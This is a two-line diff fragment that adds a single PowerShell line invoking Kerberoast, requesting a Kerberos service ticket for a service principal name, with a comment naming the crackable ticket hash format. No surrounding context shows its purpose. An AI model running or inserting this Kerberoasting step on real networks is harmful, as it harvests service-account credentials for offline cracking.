@@ -1,0 +1,2 @@
+Invoke-Kerberoast; $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; # $krb5tgs$23$
+
